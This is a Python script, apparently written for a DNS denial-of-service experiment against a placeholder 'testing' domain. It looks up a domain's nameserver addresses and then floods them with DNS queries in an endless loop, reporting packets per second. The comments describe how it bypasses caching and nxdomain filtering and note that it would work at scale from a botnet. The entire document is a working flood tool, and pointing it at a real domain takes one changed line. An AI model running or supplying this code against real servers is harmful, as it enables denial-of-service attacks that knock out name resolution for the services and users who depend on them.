# This program finds the IP address of one of the domain's nameservers
# and sends as many packets to it as possible in an attempt to overwhelm it

# Doing it like this gets around caching and could get around nxdomain filtering,
# but can be easily counteracted by IP address filtering unless performed by a large botnet

import socket
import dnslib
import signal
import sys
import time

domain = 'dummy-site-for-dns-ddos-testing.com'
nameserver_subdomains = ['ns1', 'ns2'] # Only one distinct nameserver is being used in this experiment, but this is generalied to multiple
nameserver_ips = []

# Open socket for sending packets
socket_ip = ''
socket_port = 5053 # Arbitrary upper port - anything that isn't occupied
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
socket.bind((socket_ip, socket_port))

# Obtain nameserver IP address by sending one DNS packet to a resolver
print("Looking up nameserver addresses...")
for subdomain in nameserver_subdomains:
    ns_packet = dnslib.DNSRecord.question(subdomain + "." + domain, 'A')
    socket.sendto(ns_packet.pack(), ('1.1.1.1', 53))
    ns_response_raw, ns_response_address = socket.recvfrom(512)
    ns_response = dnslib.DNSRecord.parse(ns_response_raw)
    nameserver_ips.append(str(ns_response.get_a().rdata))
print("Nameserver IP addresses obtained: " + str(nameserver_ips))

# Prepare an otherwise legitmate DNS packet to spam at the nameserver
flood_packet = dnslib.DNSRecord.question(domain, 'A')
flood_packet_raw = flood_packet.pack()

# Set signal handler to display attack stats upon termination
packet_count = 0
start_time = time.time()
def signal_handler(sig, frame):
    stop_time = time.time()
    elapsed_time = stop_time - start_time
    print()
    print("Attack terminated")
    print(str(packet_count) + " packets sent in " + str(elapsed_time) + " seconds ")
    print("(" + str(packet_count / elapsed_time) + " packets / sec)")
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# Spam packets until program terminated
print("Starting DNS flood now - press Ctrl-C to stop")
while True:
    for ip in nameserver_ips:
        try:
            socket.sendto(flood_packet_raw, (ip, 53))
            packet_count += 1
        except OSError:
            continue